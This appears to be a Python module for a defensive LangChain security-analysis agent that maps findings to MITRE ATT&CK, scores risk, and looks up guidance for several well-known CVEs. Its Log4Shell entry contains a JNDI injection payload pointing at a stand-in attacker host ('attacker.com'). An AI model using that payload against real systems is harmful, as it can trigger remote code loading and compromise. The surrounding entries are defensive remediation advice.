"""
Phase 2 — Autonomous AI Security Agent.

Multi-step LangChain agent with tool-calling for autonomous security analysis.

Tools available to the agent:
  - query_knowledge_base   — semantic search over ChromaDB + TF-IDF
  - map_mitre_attack       — map findings to MITRE ATT&CK framework
  - analyze_findings       — compute risk score and recommendations
  - suggest_exploit_path   — CVE-to-PoC guidance (education only)

When OPENAI_API_KEY is present, uses LangChain AgentExecutor (ReAct pattern).
Falls back to a deterministic multi-step pipeline when no LLM key is available.
"""
from __future__ import annotations

import logging
import os
from typing import Any, Dict, List, Optional

from .mitre_attack import map_multiple
from .rag_store import retrieve_guidance
from .vector_store import chroma_search

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# CVE exploit guidance knowledge base (educational, no working PoC code)
# ---------------------------------------------------------------------------

_CVE_GUIDANCE: Dict[str, Dict[str, str]] = {
    "cve-2021-44228": {
        "name": "Log4Shell",
        "technique": "JNDI injection — ${jndi:ldap://attacker.com/a} in any logged field",
        "affected": "Apache Log4j2 < 2.17.1",
        "patch": "Upgrade to log4j >= 2.17.1. Block ${jndi: in WAF. Set LOG4J_FORMAT_MSG_NO_LOOKUPS=true.",
        "severity": "critical",
    },
    "cve-2022-22965": {
        "name": "Spring4Shell",
        "technique": "ClassLoader manipulation via class.classLoader.URLs[0] parameter binding",
        "affected": "Spring Framework < 5.3.18 / < 5.2.20 on JDK 9+",
        "patch": "Upgrade Spring Framework. Apply WAF rules blocking class.classLoader patterns.",
        "severity": "critical",
    },
    "cve-2021-26855": {
        "name": "ProxyLogon",
        "technique": "SSRF via Exchange backend auth bypass → arbitrary write → webshell",
        "affected": "Microsoft Exchange Server 2013–2019 (before March 2021 patches)",
        "patch": "Apply Microsoft KB patches immediately. Scan for web shells in /owa and /ecp.",
        "severity": "critical",
    },
    "cve-2023-44487": {
        "name": "HTTP/2 Rapid Reset",
        "technique": "Client sends RST_STREAM immediately after HEADERS — server CPU exhaustion",
        "affected": "HTTP/2 implementations: nginx, nghttp2, IIS, Go net/http",
        "patch": "Update web server. Apply stream-reset rate limiting. Enable DDoS protection.",
        "severity": "high",
    },
    "cve-2024-3400": {
        "name": "PAN-OS GlobalProtect RCE",
        "technique": "Command injection via crafted SESSID cookie value in GlobalProtect portal",
        "affected": "Palo Alto PAN-OS < 10.2.9-h1, 11.0.4-h1, 11.1.2-h3",
        "patch": "Apply emergency hotfix or disable GlobalProtect. Enable Threat Prevention.",
        "severity": "critical",
    },
    "cve-2023-4966": {
        "name": "Citrix Bleed",
        "technique": "Buffer over-read in NetScaler — extracts session tokens from memory",
        "affected": "Citrix NetScaler ADC/Gateway before 14.1-8.50, 13.1-49.15, 13.0-92.19",
        "patch": "Update immediately. Terminate all active sessions post-patching.",
        "severity": "critical",
    },
}


def get_exploit_guidance(identifier: str) -> Dict[str, Any]:
    """
    Retrieve educational guidance for a CVE or vulnerability name.

    Args:
        identifier: CVE ID (e.g. 'CVE-2021-44228') or vulnerability name.

    Returns:
        Dict with technique, affected versions, and patch guidance.
    """
    key = identifier.lower()
    # Direct CVE lookup
    if key in _CVE_GUIDANCE:
        entry = _CVE_GUIDANCE[key]
        return {
            "identifier": identifier,
            "vulnerability": entry["name"],
            "attack_technique": entry["technique"],
            "affected_versions": entry["affected"],
            "remediation": entry["patch"],
            "severity": entry["severity"],
            "disclaimer": (
                "This information is provided for defensive security purposes only. "
                "Do not test systems without explicit written authorisation."
            ),
            "source": "internal_kb",
        }

    # Fuzzy name match
    for cve_id, data in _CVE_GUIDANCE.items():
        if (
            data["name"].lower() in key
            or key in data["name"].lower()
            or cve_id in key
        ):
            return {
                "identifier": identifier,
                "vulnerability": data["name"],
                "attack_technique": data["technique"],
                "affected_versions": data["affected"],
                "remediation": data["patch"],
                "severity": data["severity"],
                "disclaimer": (
                    "For defensive/educational use only. "
                    "Do not test without written authorisation."
                ),
                "source": "internal_kb",
            }

    # Fallback — RAG search
    rag = retrieve_guidance(identifier, top_k=2)
    return {
        "identifier": identifier,
        "vulnerability": "Unknown / not in local KB",
        "attack_technique": "See RAG guidance below",
        "affected_versions": "Not specified",
        "remediation": rag[0] if rag else "Review NVD at https://nvd.nist.gov/",
        "severity": "unknown",
        "disclaimer": "For defensive/educational use only.",
        "source": "rag_fallback",
    }


# ---------------------------------------------------------------------------
# LangChain autonomous agent
# ---------------------------------------------------------------------------

_LANGCHAIN_AVAILABLE = False
_OPENAI_AVAILABLE = False

try:
    from langchain.agents import AgentExecutor, create_react_agent  # type: ignore[import-not-found]
    from langchain.tools import Tool  # type: ignore[import-not-found]
    from langchain.prompts import PromptTemplate  # type: ignore[import-not-found]
    _LANGCHAIN_AVAILABLE = True
except Exception:
    pass

try:
    from langchain_openai import ChatOpenAI  # type: ignore[import-not-found]
    _OPENAI_AVAILABLE = True
except Exception:
    pass

_AGENT_SYSTEM_PROMPT = """You are Helix, an autonomous AI security analyst.

You have the following tools:
{tools}

Use this EXACT format:
Thought: consider what to do
Action: tool_name
Action Input: input to the tool
Observation: tool result
... (repeat as needed, max 5 steps)
Thought: I now have enough information
Final Answer: comprehensive security analysis with prioritised remediations

Tool names available: {tool_names}

Target: {target}
Findings: {findings}
Question: {input}
{agent_scratchpad}"""


def _build_agent_tools() -> List[Any]:
    """Build LangChain Tool list for the autonomous agent."""
    if not _LANGCHAIN_AVAILABLE:
        return []

    def _kb_tool(query: str) -> str:
        chroma = chroma_search(query, n_results=3)
        tfidf = retrieve_guidance(query, top_k=3)
        results = chroma or tfidf
        return "\n".join(results) if results else "No guidance found for this query."

    def _mitre_tool(findings_csv: str) -> str:
        findings = [f.strip() for f in findings_csv.split(",") if f.strip()]
        mappings = map_multiple(findings)
        return "\n".join(
            f"[{m['technique_id']}] {m['technique_name']} ({m['tactic']}): {m['mitigation']}"
            for m in mappings
        )

    def _risk_tool(findings_csv: str) -> str:
        findings = [f.strip() for f in findings_csv.split(",") if f.strip()]
        critical = sum(1 for f in findings if "critical" in f.lower())
        high = sum(1 for f in findings if "high" in f.lower())
        score = min(100, critical * 35 + high * 20 + len(findings) * 5)
        return f"Risk score: {score}/100. Critical: {critical}, High: {high}, Total: {len(findings)}."

    def _exploit_tool(cve_id: str) -> str:
        guidance = get_exploit_guidance(cve_id.strip())
        return (
            f"Vulnerability: {guidance['vulnerability']}\n"
            f"Technique: {guidance['attack_technique']}\n"
            f"Affected: {guidance['affected_versions']}\n"
            f"Remediation: {guidance['remediation']}\n"
            f"Note: {guidance['disclaimer']}"
        )

    return [
        Tool(name="query_knowledge_base", func=_kb_tool,
             description="Search security knowledge base. Input: free-text security question."),
        Tool(name="map_mitre_attack", func=_mitre_tool,
             description="Map findings to MITRE ATT&CK. Input: comma-separated finding titles."),
        Tool(name="analyze_risk", func=_risk_tool,
             description="Compute risk score. Input: comma-separated finding descriptions."),
        Tool(name="get_exploit_guidance", func=_exploit_tool,
             description="Get educational CVE guidance. Input: CVE-ID or vulnerability name."),
    ]


def _build_langchain_agent() -> Optional[Any]:
    """Build LangChain ReAct AgentExecutor; returns None if unavailable."""
    api_key = os.getenv("OPENAI_API_KEY")
    if not api_key or not _LANGCHAIN_AVAILABLE or not _OPENAI_AVAILABLE:
        return None

    try:
        llm = ChatOpenAI(model="gpt-4o-mini", temperature=0.2, openai_api_key=api_key)  # type: ignore[call-arg]
        tools = _build_agent_tools()
        prompt = PromptTemplate.from_template(_AGENT_SYSTEM_PROMPT)
        agent = create_react_agent(llm=llm, tools=tools, prompt=prompt)
        return AgentExecutor(
            agent=agent,
            tools=tools,
            verbose=False,
            max_iterations=5,
            handle_parsing_errors=True,
        )
    except Exception as exc:
        logger.warning("LangChain agent build failed: %s", exc)
        return None


# ---------------------------------------------------------------------------
# Deterministic fallback pipeline
# ---------------------------------------------------------------------------

def _deterministic_pipeline(
    target: str,
    findings: List[str],
    query: Optional[str],
) -> Dict[str, Any]:
    """
    Multi-step deterministic analysis when LLM is unavailable.

    Steps: RAG retrieval → MITRE mapping → risk scoring → recommendation synthesis
    """
    query_text = query or " ".join(findings) or target

    # Step 1: Knowledge retrieval
    chroma_hits = chroma_search(query_text, n_results=3)
    tfidf_hits = retrieve_guidance(query_text, top_k=3)
    kb_guidance = chroma_hits or tfidf_hits

    # Step 2: MITRE ATT&CK mapping
    mitre_mappings = map_multiple(findings) if findings else []
    unique_techniques = list({m["technique_id"] for m in mitre_mappings})
    unique_tactics = list({m["tactic"] for m in mitre_mappings})

    # Step 3: Risk scoring
    critical_count = sum(1 for f in findings if "critical" in f.lower())
    high_count = sum(1 for f in findings if "high" in f.lower())
    risk_score = min(100, critical_count * 35 + high_count * 20 + len(findings) * 5)

    # Step 4: Synthesised recommendations
    recommendations = [
        f"Risk Score: {risk_score}/100 — {'Immediate action required' if risk_score >= 70 else 'Remediate within sprint'}.",
        f"MITRE Techniques identified: {', '.join(unique_techniques) or 'None mapped'}.",
        f"Relevant tactics: {', '.join(unique_tactics) or 'Undetermined'}.",
    ] + kb_guidance[:3]

    # Step 5: Priority action plan
    actions = []
    for m in mitre_mappings[:3]:
        actions.append(f"[{m['technique_id']}] {m['technique_name']}: {m['mitigation']}")
    if not actions:
        actions = kb_guidance[:3]

    return {
        "target": target,
        "analysis_mode": "autonomous_deterministic_pipeline",
        "steps_executed": ["kb_retrieval", "mitre_mapping", "risk_scoring", "recommendation_synthesis"],
        "risk_score": risk_score,
        "mitre_techniques": unique_techniques,
        "mitre_tactics": unique_tactics,
        "recommendations": recommendations,
        "priority_actions": actions,
        "kb_sources": "chromadb" if chroma_hits else "tfidf",
    }


# ---------------------------------------------------------------------------
# Public entry point
# ---------------------------------------------------------------------------

def run_autonomous_agent(
    target: str,
    findings: List[str],
    query: Optional[str] = None,
) -> Dict[str, Any]:
    """
    Run the autonomous multi-step security analysis agent.

    When OPENAI_API_KEY is set: uses LangChain ReAct agent with 4 tools.
    Otherwise: runs the deterministic 5-step analysis pipeline.

    Args:
        target: Target system / URL / domain.
        findings: List of finding title strings.
        query: Optional focused question for the agent.

    Returns:
        Dict with analysis results, MITRE mappings, and prioritised actions.
    """
    agent = _build_langchain_agent()
    if agent is not None:
        try:
            input_str = query or f"Analyse security findings for {target}: {', '.join(findings[:5])}"
            result = agent.invoke(
                {
                    "target": target,
                    "findings": ", ".join(findings[:10]),
                    "input": input_str,
                }
            )
            output = result.get("output", str(result))
            return {
                "target": target,
                "analysis_mode": "langchain_react_agent",
                "agent_output": output,
                "steps_executed": ["langchain_react_with_tools"],
                "kb_sources": "chromadb+openai",
            }
        except Exception as exc:
            logger.warning("LangChain agent invocation failed, using deterministic fallback: %s", exc)

    return _deterministic_pipeline(target, findings, query)
